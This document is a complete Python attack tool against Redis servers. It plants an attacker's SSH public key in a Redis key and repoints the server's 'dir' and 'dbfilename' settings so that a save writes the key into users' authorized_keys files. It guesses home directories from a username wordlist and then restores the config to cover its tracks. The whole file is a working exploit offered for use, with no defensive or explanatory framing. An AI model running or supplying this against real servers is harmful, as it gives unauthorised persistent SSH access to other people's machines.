import redis
import argparse
import random
import string

def getRandomString(length = 6):
    return "".join([random.choice(string.ascii_letters) for _ in range(0, length)])

def getRedisInstance(host: str, port: int, password: str, dbNum: int):
    return redis.Redis(
        host=host,
        port=port,
        db=dbNum,
        password=password,
        socket_keepalive=True
    )

def doCleanupOnRedisServer(redisInstance:redis.Redis, sshAuthorizedKeyKeyName: str, prevDir: str, prevDbFilename: str):
    print("[+] Performing cleanup on target Redis server")

    # Remove stored SSH public key from memory
    if sshAuthorizedKeyKeyName != "" and redisInstance.get(name=sshAuthorizedKeyKeyName):
        try:
            result = redisInstance.delete(sshAuthorizedKeyKeyName)
            if result != 0:
                print("\t[+] Deleted SSH public key stored at key '{}'".format(sshAuthorizedKeyKeyName))
            else:
                raise Exception
        except Exception as e:
            print("\t[!] Failed to remove SSH public key stored at key '{}'".format(sshAuthorizedKeyKeyName))

    # Restore changed configs
    if prevDir != "" and prevDir != redisInstance.config_get(pattern = "dir").get("dir"):
        try:
            result = redisInstance.config_set(name = "dir", value=prevDir)
            if not result:
                raise Exception
            print("\t[+] Reset config key 'dir' back to '{}'".format(prevDir))
        except Exception as e:
            print("\t[!] Failed to reset config key 'dir' back to '{}'".format(prevDir))
    if prevDbFilename != "" and prevDbFilename != redisInstance.config_get(pattern = "dbfilename").get("dbfilename"):
        try:
            result = redisInstance.config_set(name = "dbfilename", value=prevDbFilename)
            if not result:
                raise Exception
            print("\t[+] Reset config key 'dbfilename' back to '{}'".format(prevDbFilename))
        except Exception as e:
            print("\t[!] Failed to reset config key 'dbfilename' back to '{}'".format(prevDbFilename))

def bruteforceAndWriteSshKeys(redisInstance: redis.Redis, usernamesFilepath: str, sshAuthorizedKeysDirTemplate: str, sshAuthorizedKeyFilepath):
    # Read in SSH public key
    sshAuthorizedKeyFile = open(sshAuthorizedKeyFilepath, "r")
    sshAuthorizedKey = sshAuthorizedKeyFile.read()
    sshAuthorizedKeyFile.close()

    if "PRIVATE KEY" in sshAuthorizedKey:
        print("[!] --public must point to the public key, NOT THE PRIVATE KEY. Consider reading up on this if you are unsure what you're about to do.")
        return

    print("[+] SSH Authorized key read as:\n{}".format(sshAuthorizedKey))

    # Set SSH public key in a Redis key
    try:
        sshAuthorizedKeyKeyName = getRandomString(10)
        result = redisInstance.set(name=sshAuthorizedKeyKeyName, value="\n\n{}\n\n".format(sshAuthorizedKey))
        if not result:
            raise Exception
        print("[+] SSH Authorized key set in Redis at '{}' key".format(sshAuthorizedKeyKeyName))
    except Exception as e:
        print("[!] Failed to store SSH public key on the server", e)
        doCleanupOnRedisServer(redisInstance=redisInstance, sshAuthorizedKeyKeyName=sshAuthorizedKeyKeyName, prevDir="", prevDbFilename="")
        return

    # Bruteforce user SSH directories
    print("[+] Starting user SSH directory bruteforce with template: '{}'".format(sshAuthorizedKeysDirTemplate))

    ## Save previous config
    try:
        prevDir = redisInstance.config_get(pattern="dir").get("dir")
        prevDbFilename = redisInstance.config_get(pattern="dbfilename").get("dbfilename")
        print("[+] Noted previous configs; dir: '{}', dbfilename: '{}'".format(prevDir, prevDbFilename))
    except Exception as e:
        print("[!] Failed to save previous config", e)
        doCleanupOnRedisServer(redisInstance=redisInstance, sshAuthorizedKeyKeyName=sshAuthorizedKeyKeyName, prevDir=prevDir, prevDbFilename=prevDbFilename)
        return
    
    ## Change dbfilename to store SSH public key
    try:
        result = redisInstance.config_set(name="dbfilename", value="authorized_keys")
        if not result:
            raise Exception
    except Exception as e:
        print("[!] Failed to change 'dbfilename' to 'authorized_keys'", e)
        doCleanupOnRedisServer(redisInstance=redisInstance, sshAuthorizedKeyKeyName=sshAuthorizedKeyKeyName, prevDir=prevDir, prevDbFilename=prevDbFilename)
        return

    ## Start bruteforcing user SSH directories and storing public key
    try:
        with open(usernamesFilepath, "r") as usernamesFile:                
            for username in usernamesFile:
                try:
                    usernameToUse = username.rstrip()
                    sshAuthorizedKeyFilepath = sshAuthorizedKeysDirTemplate.replace("USER", usernameToUse)

                    # Check if user exists
                    userHome = "/".join(sshAuthorizedKeyFilepath.split("/")[:-1])
                    resultUserExists = redisInstance.config_set(name = "dir", value=userHome)
                    if not resultUserExists:
                        raise Exception
                    print("[+] User '{}' exists at '{}'".format(usernameToUse, userHome))

                    # Set SSH folder
                    result = redisInstance.config_set(name = "dir", value=sshAuthorizedKeyFilepath)
                    if not result:
                        raise Exception
                    
                    # Write SSH public key to authorized_keys
                    result = redisInstance.save()
                    if not result:
                        raise Exception
                    print("\t[>>] Overwritten '{}/authorized_keys'".format(sshAuthorizedKeyFilepath))
                except Exception as e:
                    pass
    except FileNotFoundError:
        print("[!] Usernames wordlist '{}' does not exist".format(usernamesFilepath))

    # Restore changed configs
    doCleanupOnRedisServer(redisInstance=redisInstance, sshAuthorizedKeyKeyName=sshAuthorizedKeyKeyName, prevDir=prevDir, prevDbFilename=prevDbFilename)


if __name__ == "__main__":
    # Parse args
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", action="store", default="127.0.0.1", help="Target Redis server's IP address; default: 127.0.0.1")
    parser.add_argument("-P", "--port", action="store", default="6379", help="Target Redis server's port; default: 6379")
    parser.add_argument("-p", "--password", action="store", default="", help="Login password; default: ''")
    parser.add_argument("-n", "--database", action="store", default="0", help="DB number; default: 0")
    parser.add_argument("-w", "--usernames", action="store", help="Usernames wordlist to use for bruteforcing")
    parser.add_argument("--public", action="store", help="The public SSH key to overwrite; use 'ssh-keygen' to generate the key pair")
    parser.add_argument("-d", "--dir", action="store", default="/home/USER/.ssh", help="User SSH directory format; must contain 'USER' placeholder; default: '/home/USER/.ssh'")
    args = parser.parse_args()

    host = args.host
    port = int(args.port)
    password = args.password if args.password != "" else None
    dbNum = int(args.database)
    usernamesFilepath = args.usernames
    sshAuthorizedKeyFilepath = args.public
    sshAuthorizedKeysDirTemplate = args.dir

    # Login
    redisInstance = getRedisInstance(host=host, port=port, password=password, dbNum=dbNum)

    # Bruteforce
    bruteforceAndWriteSshKeys(redisInstance=redisInstance, usernamesFilepath=usernamesFilepath, sshAuthorizedKeyFilepath=sshAuthorizedKeyFilepath, sshAuthorizedKeysDirTemplate=sshAuthorizedKeysDirTemplate)

    #Close the instance
    redisInstance.close() 
    